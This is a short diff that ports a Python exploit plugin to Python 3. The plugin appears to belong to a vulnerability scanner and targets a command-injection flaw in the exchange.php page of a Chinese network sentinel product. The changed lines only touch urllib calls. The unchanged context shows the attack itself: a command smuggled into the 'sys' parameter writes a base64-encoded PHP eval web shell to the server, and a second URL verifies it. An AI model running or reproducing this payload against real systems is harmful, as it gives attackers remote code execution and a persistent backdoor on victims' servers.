@@ -3,7 +3,7 @@
 #中科新业网络哨兵系统exchange.php远程命令执行漏洞
 #http://www.wooyun.org/bugs/wooyun-2015-0110528
 import random
-import urllib
+import urllib.request, urllib.parse, urllib.error
 
 def assign(service, arg):
     if service == 'seentech_uccenter':
@@ -16,7 +16,7 @@ def audit(arg):
             data="<?php print(md5('1'));@eval($_POST[0]);?>".encode("base64").strip(),
             filename="testvul"+str(randnum)+".php",
         )
-    cmd = urllib.quote(cmd)
+    cmd = urllib.parse.quote(cmd)
     exp_url =url + "manage/admin/exchange.php?sys=whoami;{cmd};".format(cmd=cmd)
     vef_url = url + "manage/admin/testvul{num}.php".format(num=randnum)
     headers = {'Content-Type' : 'application/x-www-form-urlencoded'}
